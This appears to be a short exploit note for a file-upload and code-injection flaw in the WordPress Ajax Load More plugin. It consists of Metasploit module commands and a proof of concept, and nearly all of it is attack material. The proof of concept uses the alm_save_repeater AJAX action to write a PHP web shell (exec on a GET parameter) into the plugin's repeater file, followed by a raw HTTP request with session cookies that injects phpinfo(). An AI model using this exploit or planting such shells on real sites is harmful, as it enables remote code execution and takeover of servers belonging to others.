# Metasploit
Module wp_ajax_load_more_file_upload.rb

	msf > use exploit/unix/webapp/wp_ajax_load_more_file_upload
      msf exploit(wp_ajax_load_more_file_upload) > show targets
            ...targets...
      msf exploit(wp_ajax_load_more_file_upload) > set TARGET <target-id>
      msf exploit(wp_ajax_load_more_file_upload) > show options
            ...show and set options...
      msf exploit(wp_ajax_load_more_file_upload) > exploit
	  
# PoC : 
POST http://<WP-path>/wp-admin/admin-ajax.php

action=alm_save_repeater
nonce=<WP-nonce> (sau khi đăng nhập, view source html để xem nonce)
type=default
repeater=blablabla
value=<?php exec($_GET['cmd']) ?>

=> The provided PHP evil code will be stored in ajax-load-more/core/repeater/default.php
=> http://target.com/wordpress-4.7.1/wp-content/plugins/ajax-load-more/core/repeater/default.php


Request:
POST /wordpress-4.7.1/wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: wordpress_fe0097b17fa0dc3fa07df164bd4a2642=mrx%7C1534560758%7C3iQFzqMlH41XfxOZMRrWXmZMR9j0dksaTwdwnbQgtSs%7Cdd9960e16520bdf09e4b7d4d2dff1471e670c076cb13a87f46bb856a4e4e089e; wp-settings-1=editor%3Dhtml%26libraryContent%3Dbrowse%26post_dfw%3Doff%26hidetb%3D1%26posts_list_mode%3Dlist; wp-settings-time-1=1532945729; wp-settings-time-2=1503369471; wp-settings-2=mfold%3Do; wp-settings-time-3=1503371118; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_fe0097b17fa0dc3fa07df164bd4a2642=mrx%7C1534560758%7C3iQFzqMlH41XfxOZMRrWXmZMR9j0dksaTwdwnbQgtSs%7Cc30fff33f358cb0b9b16cacf2e3726858e610080c3e73e339d629648814c32e3; wordpress_logged_in_fe0097b17fa0dc3fa07df164bd4a2642=mrx%7C1534749602%7CxLOuOSy8fIbSaHurF9uCE7Kho4uSSQoGApN4l6STLXF%7C1b6fb4d85cb1c1ced2f7781a49c827f829f966a6ad58a06497c32ffccd2152dd; PHPSESSID=odpek3acdbpbn7u5jaocvi8bm5
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 122

action=alm_save_repeater&value=%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E&repeater=default&type=default&alias=&nonce=e7eed93aad